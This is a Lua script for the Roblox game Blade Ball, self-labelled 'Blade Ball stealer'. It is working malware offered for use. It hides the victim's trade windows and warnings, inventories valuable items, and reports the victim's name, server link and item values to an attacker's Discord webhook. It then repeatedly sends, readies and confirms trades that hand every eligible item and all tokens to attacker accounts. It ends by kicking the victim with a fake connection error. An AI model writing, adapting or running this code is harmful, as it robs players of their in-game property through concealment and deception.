-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- // VARIABLES SERVICES
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // CONFIGURATION UTILISATEUR
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = "EBK-SS-A" 
local headshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"

-- // VÉRIFICATIONS
if next(users) == nil or webhook == "" then
    plr:kick("Configuration Error: Usernames or Webhook is empty.")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Script Error: Only works on Blade Ball.")
    return
end

-- // VÉRIFICATION DU PIN CODE
local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account Error: Please disable your Trade PIN.")
    return
end

-- // NETTOYAGE UI
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)

local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        task.spawn(function()
            if plr.Character then
                for i = 1, 15 do
                    for _, obj in ipairs(plr.Character:GetDescendants()) do
                        if obj:IsA("BillboardGui") then obj:Destroy() end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

-- // FONCTIONS DE TRADE CORRIGÉES (SYSTÈME PERSISTANT)
local function sendTradeRequest(user)
    local target = Players:WaitForChild(user)
    repeat
        task.wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
    until inTrade == true
end

local function addItemToTrade(itemType, ID)
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
end

-- Cette fonction ne s'arrête pas tant que le Ready n'est pas passé
local function readyTrade()
    task.spawn(function()
        while inTrade do
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.2)
        end
    end)
end

-- Cette fonction ne s'arrête pas tant que le trade n'est pas validé/fermé
local function confirmTrade()
    task.spawn(function()
        while inTrade do
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            task.wait(0.2)
        end
    end)
end

-- // FORMATAGE RAP & MESSAGES DISCORD
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local botUsername = (totalRAP >= 500) and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local fields = {
        {name = "Victim Username 🤖:", value = plr.Name, inline = true},
        {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list 📝:", value = "", inline = false},
        {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP}
        end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - **%s RAP**\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end
    if #fields[3].value > 1024 then fields[3].value = string.sub(fields[3].value, 1, 1000) .. "..." end

    local data = {
        ["username"] = botUsername,
        ["avatar_url"] = headshot,
        ["content"] = prefix .. "```game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')```",
        ["embeds"] = {{
            ["title"] = botUsername,
            ["color"] = (totalRAP >= 500 and 65280 or 8323327),
            ["fields"] = fields,
            ["thumbnail"] = {["url"] = headshot},
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // RÉCUPÉRATION RAP
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items
local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end
    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end
local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // LANCEMENT
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendJoinMessage(itemsToSend, (ping == "Yes" and "--[[@everyone]] " or ""))

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.5) until inTrade

            -- Ajout Items
            local batchSize = 100
            for i = 1, math.min(batchSize, #itemsToSend) do
                local item = table.remove(itemsToSend, 1)
                addItemToTrade(item.itemType, item.ItemID)
            end

            -- Ajout Tokens (FIXED PATH)
            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            task.wait(1.5) -- Temps pour laisser la victime réagir
            readyTrade()
            confirmTrade()
            
            repeat task.wait(0.5) until not inTrade
        end
        plr:kick("Connection Error")
    end

    local function waitForUserJoin()
        local function onUserJoin(player)
            if table.find(users, player.Name) then doTrade(player.Name) end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
